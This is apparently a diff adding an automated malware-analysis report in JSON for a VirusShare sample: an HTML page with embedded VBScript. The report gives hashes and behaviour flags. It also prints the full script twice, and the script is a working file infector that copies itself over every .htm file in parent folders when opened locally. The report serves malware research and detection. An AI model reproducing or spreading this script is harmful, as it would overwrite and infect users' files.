@@ -1,0 +1,55 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Call": "May call a DLL using Excel 4 Macros",
+            "CopyFile": "May copy a file",
+            "CreateObject": "May create an OLE object"
+        },
+        "macro": "<BODY Onload=\"Redirect();\"><script language=\"VBScript\"><!-- Sub Redirect Randomize \nIf location.protocol = \"file:\" AND (Int((6 * Rnd) + 1) = 1) then Call Offline \nlocation.href = location.href +\"l\" \nEnd Sub Sub Offline Dim FSO,folder ,fc, f1, cpath \nSet FSO = CreateObject(\"Scripting.FileSystemObject\") \nHostPath = Replace(location.href, \"file:///\", \"\") \nHostPath = Replace(HostPath, \"/\", \"\\\") \ncpath = fso.GetParentFolderName(HostPath) \nSet folder = fso.GetFolder(cpath) While folder.IsRootFolder = false \nSet folder = fso.GetFolder(cpath) Set fc = folder.Files \ncpath = fso.GetParentFolderName(cpath) For each f1 in fc \ns = Lcase(Fso.GetExtensionName(f1.name)) \nIf s = \"htm\" and fso.FileExists(f1.path+\"l\") = False then \nfso.CopyFile f1.path, f1.path+\"l\", true \nfso.CopyFile HostPath, f1.path, true End If Next Wend \nIf (Int((10 * Rnd) + 1) + 1) = 1 Then MsgBox(\"HTML.Redirect /1nternal\") End Sub --></script> \n<!--Mocc/#Mai $Fanta & qupter configress +50;/Shera++/con;con;--></BODY>"
+    },
+    "filename": "VirusShare_9cbb17532b820aaef2f44cc9f3003cbd",
+    "filesize": 1001,
+    "filetype": "HTML document, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "9cbb17532b820aaef2f44cc9f3003cbd",
+        "sha1": "927f7dc485c0bd025cf916abb763ce37a0d0bfd7",
+        "sha256": "228d0473d188a3acdb4b7308e7166a7598165d3901c2c56b7291d2eae24fbe27"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<BODY Onload=\"Redirect();\"><script language=\"VBScript\"><!-- Sub Redirect Randomize ",
+            "If location.protocol = \"file:\" AND (Int((6 * Rnd) + 1) = 1) then Call Offline ",
+            "location.href = location.href +\"l\" ",
+            "End Sub Sub Offline Dim FSO,folder ,fc, f1, cpath ",
+            "Set FSO = CreateObject(\"Scripting.FileSystemObject\") ",
+            "HostPath = Replace(location.href, \"file:///\", \"\") ",
+            "HostPath = Replace(HostPath, \"/\", \"\\\") ",
+            "cpath = fso.GetParentFolderName(HostPath) ",
+            "Set folder = fso.GetFolder(cpath) While folder.IsRootFolder = false ",
+            "Set folder = fso.GetFolder(cpath) Set fc = folder.Files ",
+            "cpath = fso.GetParentFolderName(cpath) For each f1 in fc ",
+            "s = Lcase(Fso.GetExtensionName(f1.name)) ",
+            "If s = \"htm\" and fso.FileExists(f1.path+\"l\") = False then ",
+            "fso.CopyFile f1.path, f1.path+\"l\", true ",
+            "fso.CopyFile HostPath, f1.path, true End If Next Wend ",
+            "If (Int((10 * Rnd) + 1) + 1) = 1 Then MsgBox(\"HTML.Redirect /1nternal\") End Sub --></script> ",
+            "<!--Mocc/#Mai $Fanta & qupter configress +50;/Shera++/con;con;--></BODY>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "file:///"
+        ]
+    },
+    "time": "0:00:00.277203",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
